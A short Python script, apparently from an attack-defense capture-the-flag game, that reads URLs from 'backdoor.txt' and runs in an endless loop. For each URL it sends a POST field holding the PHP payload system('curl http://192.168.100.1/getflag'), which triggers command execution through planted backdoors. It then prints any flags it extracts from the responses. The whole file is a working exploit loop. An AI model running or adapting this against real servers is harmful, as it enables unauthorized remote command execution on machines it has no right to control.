import requests
from mirzam import mirzam

while True:
    with open('backdoor.txt', 'r') as f:
        for url in f.readlines():
            r = requests.post(url, data={"getflag": "system('curl http://192.168.100.1/getflag');"})
            if (r.status_code == 404) or (r.status_code == 502):
                continue
            if r.text.strip() == "":
                continue

            m = mirzam(r.text.strip())
            if m:
                print(m)
